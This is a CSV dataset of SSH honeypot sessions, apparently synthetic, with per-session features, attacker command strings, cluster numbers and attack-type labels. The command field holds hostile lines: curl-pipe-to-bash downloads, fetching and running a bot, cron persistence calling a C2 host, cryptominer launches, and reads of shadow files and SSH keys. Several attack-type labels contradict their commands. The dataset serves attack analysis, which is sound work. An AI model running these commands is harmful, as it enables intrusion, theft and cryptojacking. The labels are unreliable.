session_id,src_ip,country,login_attempts,login_success,num_commands,session_duration,dst_port,recon_score,persistence_score,mining_score,lateral_score,exfil_score,has_download,has_chmod,has_cron,has_useradd,raw_commands,cluster,attack_type
54b064d540f44803,159.89.49.114,United States,5,1,3,28,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
8ba2027d108149d5,5.188.86.172,Russia,5,0,0,13,22,0,0,0,0,0,0,0,0,0,0,1,Recon
fa696aca0bbf478d,138.197.148.152,United States,4,1,3,19,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
48bc5699c93443e1,92.255.57.210,Russia,3,0,0,9,22,0,0,0,0,0,0,0,0,0,0,1,Recon
2357d257874349eb,68.183.39.102,United States,4,1,1,15,22,0,1,0,0,0,1,0,0,0,curl -s http://45.33.32.156/install.sh | bash,4,Lateral Movement
02daaeb90eaf4e7e,167.71.13.196,United States,5,0,0,13,22,0,0,0,0,0,0,0,0,0,0,1,Recon
c3afd4f677634685,180.129.12.93,China,1,1,3,9,22,0,2,0,0,0,1,1,0,0,wget http://malicious.ru/bot -O /tmp/bot chmod +x /tmp/bot /tmp/bot &,3,Cryptominer
0da3f44b019e4d64,218.92.0.158,China,5,0,0,17,22,0,0,0,0,0,0,0,0,0,0,1,Recon
9f81cf96f25d4a31,167.71.13.196,United States,4,1,3,26,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
ace9ea32fbd44bcc,157.245.108.55,United States,2,0,0,7,22,0,0,0,0,0,0,0,0,0,0,1,Recon
66dbd70b04a749ef,134.209.82.19,United States,2,0,0,7,22,0,0,0,0,0,0,0,0,0,0,1,Recon
80681a0c87ce4218,198.199.65.32,United States,4,0,0,9,22,0,0,0,0,0,0,0,0,0,0,1,Recon
fab6a8cb07d64f44,5.188.86.172,Russia,3,0,0,10,22,0,0,0,0,0,0,0,0,0,0,1,Recon
79c56a0e2df24377,206.189.32.177,United States,5,0,0,18,22,0,0,0,0,0,0,0,0,0,0,1,Recon
68bd519d5cf94476,134.209.82.19,United States,2,1,2,11,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
fe66fde857254887,167.71.13.196,United States,5,0,0,16,22,0,0,0,0,0,0,0,0,0,0,1,Recon
c3d03c2f5d924ad9,206.189.32.177,United States,4,1,1,12,22,0,1,0,0,0,1,0,0,0,curl -s http://45.33.32.156/install.sh | bash,4,Lateral Movement
869eda24ca0c4750,178.128.21.44,Singapore,5,1,1,22,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root,0,Scanner
25ed4d56cb2341d8,68.183.39.102,United States,4,0,0,16,22,0,0,0,0,0,0,0,0,0,0,1,Recon
8cbb661322d74e31,185.220.101.45,Germany,4,0,0,10,22,0,0,0,0,0,0,0,0,0,0,1,Recon
a0ccdf8431af4866,222.186.15.101,China,1,1,5,34,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
b8ab6af0ffad4414,91.240.118.172,Ukraine,4,1,5,40,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
536669c83a574c6f,180.129.12.93,China,5,1,3,29,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
804f14338f2e470b,134.209.82.19,United States,3,0,0,11,22,0,0,0,0,0,0,0,0,0,0,1,Recon
0c0f26ebb8e0490a,178.128.21.44,Singapore,3,0,0,7,22,0,0,0,0,0,0,0,0,0,0,1,Recon
b6b50eafdd9e4bf5,104.236.198.48,United States,2,1,3,22,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
2ae278671be0403d,5.188.86.172,Russia,5,1,3,33,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
7a74691b338c4d07,198.199.65.32,United States,1,1,5,21,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
d3714ca322cf462f,198.199.65.32,United States,5,0,0,13,22,0,0,0,0,0,0,0,0,0,0,1,Recon
c8ba8faa4cbf4384,185.220.101.45,Germany,3,1,3,23,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
9fb428802d784859,103.99.0.122,India,3,1,2,23,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null,4,Lateral Movement
b73c35f956514076,159.89.49.114,United States,5,1,1,17,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root,0,Scanner
84b83d969cb14898,117.21.191.131,China,3,1,1,11,22,0,0,0,3,0,0,0,0,0,for i in $(seq 1 254); do ping -c1 192.168.1.$i; done,4,Lateral Movement
eaee1009396541bf,157.245.108.55,United States,1,1,5,22,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
cbf2d9a60ed040f6,180.129.12.93,China,3,1,3,23,22,0,2,0,0,0,1,1,0,0,wget http://malicious.ru/bot -O /tmp/bot chmod +x /tmp/bot /tmp/bot &,3,Cryptominer
43a126f3b7174af7,117.21.191.131,China,1,1,2,15,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a,4,Lateral Movement
5f2a0f749b584b24,92.255.57.210,Russia,3,0,0,9,22,0,0,0,0,0,0,0,0,0,0,1,Recon
060578f8f1cd4d85,194.165.16.11,Russia,3,1,2,19,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
984be505f7d64ad8,211.94.20.175,China,5,1,1,20,22,0,1,0,0,0,1,0,0,0,curl -s http://45.33.32.156/install.sh | bash,4,Lateral Movement
f54194f2280740ce,179.60.150.100,Brazil,4,1,3,19,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
a67be62724fb48f1,178.128.21.44,Singapore,1,0,0,5,22,0,0,0,0,0,0,0,0,0,0,1,Recon
9f9f0bd9d0da46e0,222.186.15.101,China,3,1,1,19,22,0,1,0,0,0,1,0,0,0,curl -s http://45.33.32.156/install.sh | bash,4,Lateral Movement
0874ce3eb9f54815,117.21.191.131,China,1,1,2,12,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a,4,Lateral Movement
335b176ff96b4c12,45.95.147.236,Netherlands,3,1,5,35,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
c02d9716c10b4c8d,198.199.65.32,United States,5,0,0,13,22,0,0,0,0,0,0,0,0,0,0,1,Recon
d0b05fb4bdd04961,91.240.118.172,Ukraine,5,1,3,34,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
541834b8f9b846f3,103.99.0.122,India,5,1,1,22,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root,0,Scanner
bd8426b9db1c4b4e,206.189.32.177,United States,1,1,3,22,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
d360c409a03f4727,104.236.198.48,United States,3,0,0,9,22,0,0,0,0,0,0,0,0,0,0,1,Recon
5c9ce0ab98d94b70,193.32.162.8,Russia,2,1,5,28,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
9811e67dc58a4a95,185.220.101.45,Germany,4,1,3,22,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
b3f3921ab033455a,179.60.150.100,Brazil,1,0,0,2,22,0,0,0,0,0,0,0,0,0,0,1,Recon
15b6b62d8a024ab6,185.220.101.45,Germany,5,0,0,14,22,0,0,0,0,0,0,0,0,0,0,1,Recon
64ddfffd42f54963,103.99.0.122,India,4,1,2,26,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a,4,Lateral Movement
5f99f80b1cea4ec7,167.71.13.196,United States,2,1,2,19,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a,4,Lateral Movement
a5c897b4d05844f7,193.32.162.8,Russia,1,0,0,4,22,0,0,0,0,0,0,0,0,0,0,1,Recon
4f6680590fde4784,117.21.191.131,China,3,0,0,12,22,0,0,0,0,0,0,0,0,0,0,1,Recon
ea8366c5674b45ea,198.199.65.32,United States,2,0,0,7,22,0,0,0,0,0,0,0,0,0,0,1,Recon
17ec3918ee6e4f31,5.188.86.172,Russia,2,1,3,21,22,0,2,0,0,0,1,1,0,0,wget http://malicious.ru/bot -O /tmp/bot chmod +x /tmp/bot /tmp/bot &,3,Cryptominer
ad70d4799c9c453b,222.186.15.101,China,3,1,1,10,22,0,1,0,0,0,1,0,0,0,curl -s http://45.33.32.156/install.sh | bash,4,Lateral Movement
eb2eddb76af34830,167.71.13.196,United States,4,1,2,22,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a,4,Lateral Movement
2822186e8f99449c,68.183.39.102,United States,3,1,5,39,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
690a086e7bee416b,45.95.147.236,Netherlands,2,1,3,27,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
7f97328f27a1455d,180.129.12.93,China,1,1,5,28,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
a9263c4c14034747,179.60.150.100,Brazil,4,0,0,12,22,0,0,0,0,0,0,0,0,0,0,1,Recon
4952afa21d11495f,198.199.65.32,United States,5,0,0,17,22,0,0,0,0,0,0,0,0,0,0,1,Recon
a0a3cba00fd8460f,104.236.198.48,United States,2,1,5,29,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /,2,Persistence
1ad871d981894f8f,80.82.77.139,Netherlands,2,1,3,25,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
237679e10df148aa,185.220.101.45,Germany,4,1,2,19,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
58f7b000da0f4af5,5.188.86.172,Russia,4,0,0,14,22,0,0,0,0,0,0,0,0,0,0,1,Recon
41405cb704ee47ca,194.165.16.11,Russia,2,1,1,14,22,0,0,0,3,0,0,0,0,0,for i in $(seq 1 254); do ping -c1 192.168.1.$i; done,4,Lateral Movement
cc39055326f7451b,164.92.98.77,United States,5,1,3,36,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
ee8ac2b10d2445d3,164.92.98.77,United States,1,1,2,16,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
c494c482eadb49c4,103.99.0.122,India,3,0,0,8,22,0,0,0,0,0,0,0,0,0,0,1,Recon
c123fae6213d4350,164.92.98.77,United States,1,0,0,4,22,0,0,0,0,0,0,0,0,0,0,1,Recon
d9eb1876734f44ee,159.89.49.114,United States,1,1,1,9,22,0,1,0,0,0,1,0,0,0,curl -s http://45.33.32.156/install.sh | bash,4,Lateral Movement
8ab2058bfc1f497e,179.60.150.100,Brazil,5,1,5,35,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
7986ac791da14d03,134.209.82.19,United States,3,1,3,20,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
94a44bf9786a41e5,157.245.108.55,United States,3,0,0,9,22,0,0,0,0,0,0,0,0,0,0,1,Recon
212fc4a7a2ec4681,178.128.21.44,Singapore,1,0,0,3,22,0,0,0,0,0,0,0,0,0,0,1,Recon
b653e5c01e484df8,104.236.198.48,United States,5,1,3,35,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
b9e3ea6d411a450b,58.218.211.36,China,4,1,2,22,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
4c2eb3875c474314,45.142.212.100,Netherlands,2,1,5,26,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
c8e5869f4cda4673,134.209.82.19,United States,2,1,5,41,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
cdd45a4280364ade,103.99.0.122,India,5,1,3,28,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
769f560e52b2491a,211.94.20.175,China,4,1,2,17,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null,4,Lateral Movement
f8ad61c4bc474e23,104.236.198.48,United States,1,1,2,16,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null,4,Lateral Movement
b632ee6d97674449,45.142.212.100,Netherlands,3,0,0,8,22,0,0,0,0,0,0,0,0,0,0,1,Recon
2d1e6ae83bae43c1,179.60.150.100,Brazil,3,1,3,30,22,0,2,0,0,0,1,1,0,0,wget http://malicious.ru/bot -O /tmp/bot chmod +x /tmp/bot /tmp/bot &,3,Cryptominer
bb8eb874b1c8477e,58.218.211.36,China,3,0,0,6,22,0,0,0,0,0,0,0,0,0,0,1,Recon
bf82cafb58774160,5.188.86.172,Russia,5,1,3,28,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
08c1f2171c634785,104.236.198.48,United States,4,1,3,31,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
5a5c243d54dd430b,103.99.0.122,India,2,1,3,21,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
2040848dcffb4d0e,104.236.198.48,United States,5,0,0,21,22,0,0,0,0,0,0,0,0,0,0,1,Recon
fc27939517be496f,206.189.32.177,United States,2,0,0,3,22,0,0,0,0,0,0,0,0,0,0,1,Recon
a2c1eb5ba8874876,179.60.150.100,Brazil,1,1,2,14,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a,4,Lateral Movement
a494240037884dbf,68.183.39.102,United States,1,0,0,5,22,0,0,0,0,0,0,0,0,0,0,1,Recon
06bb3d4fc28c4070,193.32.162.8,Russia,5,0,0,16,22,0,0,0,0,0,0,0,0,0,0,1,Recon
9339caa05a094dcc,167.71.13.196,United States,2,0,0,9,22,0,0,0,0,0,0,0,0,0,0,1,Recon
e7e776fc57154d9a,222.186.15.101,China,3,0,0,8,22,0,0,0,0,0,0,0,0,0,0,1,Recon
a03e6f0eaf174da3,198.199.65.32,United States,2,0,0,10,22,0,0,0,0,0,0,0,0,0,0,1,Recon
78a2e0e2dcfd435c,117.21.191.131,China,1,1,5,23,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
3f30e411ad824c5f,138.197.148.152,United States,3,1,5,37,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /,2,Persistence
07a756cd1fa04452,206.189.32.177,United States,5,1,3,26,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
8566318413534386,104.236.198.48,United States,2,0,0,7,22,0,0,0,0,0,0,0,0,0,0,1,Recon
190cea84a2274025,159.89.49.114,United States,5,1,5,37,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
55c71844927046ba,193.32.162.8,Russia,5,1,5,38,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
6cb5128fceb34c94,80.82.77.139,Netherlands,4,0,0,14,22,0,0,0,0,0,0,0,0,0,0,1,Recon
04e1665aa17544ba,117.21.191.131,China,3,1,3,30,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
d752d64f92194a47,80.82.77.139,Netherlands,4,0,0,15,22,0,0,0,0,0,0,0,0,0,0,1,Recon
1adc316a4e324685,194.165.16.11,Russia,5,1,3,23,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
d164adc5145d427c,91.240.118.172,Ukraine,2,1,3,18,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
5cde9ffec6b6439e,91.240.118.172,Ukraine,3,1,3,19,22,0,2,0,0,0,1,1,0,0,wget http://malicious.ru/bot -O /tmp/bot chmod +x /tmp/bot /tmp/bot &,3,Cryptominer
19bdbd31a8644d07,138.197.148.152,United States,3,0,0,10,22,0,0,0,0,0,0,0,0,0,0,1,Recon
6bb82e70f8e84158,104.236.198.48,United States,3,1,3,15,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
5267f652c68047c9,159.89.49.114,United States,4,0,0,8,22,0,0,0,0,0,0,0,0,0,0,1,Recon
f247430e547c4b0f,193.32.162.8,Russia,4,1,3,29,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
b3c44be9077e48c4,157.245.108.55,United States,3,0,0,9,22,0,0,0,0,0,0,0,0,0,0,1,Recon
d806caa3519c42ad,180.129.12.93,China,3,1,3,24,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
d7a503a139d1492f,164.92.98.77,United States,1,1,2,13,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null,4,Lateral Movement
75e21546ccd6428f,58.218.211.36,China,2,0,0,7,22,0,0,0,0,0,0,0,0,0,0,1,Recon
3b762d9db69a4e54,92.255.57.210,Russia,1,1,3,8,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
86c6b73bc84a40a3,194.165.16.11,Russia,2,1,2,15,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
b90786f1d2444850,157.245.108.55,United States,2,1,3,22,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
bb0cadcab6674ac0,103.99.0.122,India,3,1,5,37,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
3716120f3c6840de,222.186.15.101,China,5,0,0,10,22,0,0,0,0,0,0,0,0,0,0,1,Recon
